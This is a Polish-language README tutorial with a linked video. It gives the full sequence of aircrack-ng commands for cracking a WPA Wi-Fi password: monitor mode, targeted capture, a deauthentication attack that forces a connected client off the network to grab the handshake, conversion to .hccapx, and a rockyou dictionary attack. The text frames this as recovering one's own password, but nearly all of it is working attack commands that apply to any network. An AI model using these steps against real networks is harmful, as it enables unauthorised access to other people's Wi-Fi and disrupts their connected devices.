# FILM

[![Watch the video](https://img.youtube.com/vi/p_kWb7se5cQ/maxresdefault.jpg)](https://youtu.be/p_kWb7se5cQ)

# TUTORIAL

1) Wlacz nasluchiwanie przez karte sieciowa

``` airmon-ng start wlan0  ```

Mamy teraz nowa nazwe karty:

``` wlan0mon ```

2) Nasluchuj sieci w poblizu i znajdz swoja:

``` airodump-ng wlan0mon ```

3) Gdy zobaczysz swoja siec zastopuj nasluchiwanie i skopiuj bssid, oraz
kanal:

``` airodump-ng wlan0mon --bssid MAC -c CHANNEL [np. 6] ```

4) Gdy juz zobaczysz ze nasluchuje tylko te siec i wszystko dziala
mozemy przystapic do dzialania.

Zastopuj i dopisz do komendy:

``` -w NAZWA ```

Spowoduje to wypisywanie do plikow o danej nazwie wszystkiego co sie dzieje podczas
nasluchiwania. Przyda nam sie to do przejecia pliku .cap

5) Szukamy MAC'ow aktualnie podlaczonych urzadzen do routera. Kopiujemy go i bssid do
nastepnej komendy.

6) Majac wlaczone nasluchwanie wykonujemy:

```
 aireplay-ng -a BSSID_MAC -c CLIENT_MAC --deauth 40 wlan0mon
```

Zostana wyslane do klienta pakiety ktore rozlacza go na chwile z sieci,
aby musial znow sie do niej automatycznie podlaczyc.

7) Po chwili zatrzymujemy atak i patrzymy czy w poprzedniej konsoli gdzie
nasluchiwalismy pokazala sie wiadomosc:

``` WPA handshake ```

Jesli tak wylaczamy nasluchiwanie. Jesli nie powtarzamy.

8) Karta w trybie nasluchwania juz nam sie nie przyda wiec mozemy ja wylaczyc i 
wrocic do poprzedniej wersji:

``` airmon-ng stop wlan0mon ```

Teraz mozesz ponownie korzystac z internetu na komputerze ;) 

9) Przystepujemy do zmiany pliku .cap na --> .hccapx

W tym celu uzyjemy narzedzia aircrack. Mozesz lamac to innymi ktore maja 
taka opcje np. hashcat'em.

Opcja:

``` -j ```

Pomoze nam w zamianie.

10) Wpisujemy:

``` aircrack-ng -j OUTPUT_NAME NAZWA.cap ```

Po chwili powinnien pokazac ci sie plik o nazwie ktora podales po parametrze
-j.

11) Podchodzimy do odzyskiwania hasla. W tym celu bedziemy potrzebowac jakis
slownik mozemy uzyc jakiegos z np. systemu kali.

``` aircrack-ng NAZWA.hccapx -w /usr/share/wordlists/rockyou.txt [slownik] ```

Jesli w slowniku natrafi na nasze haslo pokaze nam to.

12) Powodzenia w odzyskiwaniu!
